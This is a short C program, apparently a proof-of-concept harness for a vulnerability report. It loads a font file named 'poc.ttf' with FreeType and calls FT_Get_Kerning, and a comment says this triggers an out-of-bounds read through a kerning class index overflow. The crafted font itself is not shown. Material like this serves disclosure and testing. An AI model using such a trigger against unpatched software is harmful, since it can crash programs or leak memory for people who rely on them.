#include <stdio.h>
#include <stdlib.h>
#include <ft2build.h>
#include FT_FREETYPE_H

int main(int argc, char **argv)
{
    FT_Library library;
    FT_Face    face;
    FT_Vector  kerning;

    const char *path = argc > 1 ? argv[1] : "poc.ttf";
    FILE *f = fopen(path, "rb");
    if (!f) { perror("fopen"); return 1; }
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    rewind(f);
    unsigned char *buf = malloc(size);
    if (fread(buf, 1, size, f) != (size_t)size) { perror("fread"); return 1; }
    fclose(f);

    FT_Init_FreeType(&library);
    FT_Error err = FT_New_Memory_Face(library, buf, size, 0, &face);
    if (err) {
        fprintf(stderr, "FT_New_Memory_Face failed: %d\n", err);
        return 2;
    }
    FT_Set_Char_Size(face, 0, 12 * 64, 72, 72);

    /* Trigger OOB read in tt_face_get_pair_pos2_kerning via class index overflow */
    FT_Get_Kerning(face, 1, 2, FT_KERNING_UNSCALED, &kerning);

    fprintf(stderr, "kerning.x = %ld\n", (long)kerning.x);

    FT_Done_Face(face);
    FT_Done_FreeType(library);
    free(buf);
    return 0;
}
